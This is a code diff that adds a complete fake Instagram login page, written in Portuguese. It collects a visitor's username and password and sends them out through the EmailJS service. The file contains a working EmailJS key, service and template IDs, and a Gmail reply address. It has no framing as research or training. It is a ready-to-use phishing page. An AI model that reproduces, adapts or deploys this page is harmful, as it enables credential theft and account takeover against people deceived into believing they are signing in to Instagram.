@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="imagens/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <title>Instagram</title>
+</head>
+<body>
+  
+    <img src="imagens/instagram.png" alt="Instagram">
+    <section>
+        <p><input type="text" id="usuario" autocomplete="username" placeholder="Nome de Usuário"></p>
+        <p><input type="text" id="senha" autocomplete="current-password" placeholder="Senha"></p>
+        <button onclick="enviarEmail()">Entrar</button>
+    </section>
+  
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  
+    <script type="text/javascript">
+  (function() {
+    emailjs.init({
+      publicKey: "HfNHW9OuU4rH_PU3H"
+    }); // Substitua pelo seu User ID
+  })();
+
+  function enviarEmail() {
+    if (usuario.value == "" || senha.value == "") {
+      return
+    }
+    emailjs.send("service_009e19g", "template_4epyull", {
+      to_name: "Nome do Destinatário",
+      from_name: "Hest",
+      message: `Usuário: ${usuario.value}, senha: ${senha.value}`,
+      reply_to: "kingmastercllr@gmail.com"
+    })
+    .then(function(response) {
+      console.log('SUCCESS!', response.status, response.text);
+      alert("Sucesso!")
+    }, function(error) {
+      console.log('FAILED...', error);
+      alert('Falha ao enviar o email.');
+    });
+  }
+    </script>
+</body>
+</html>
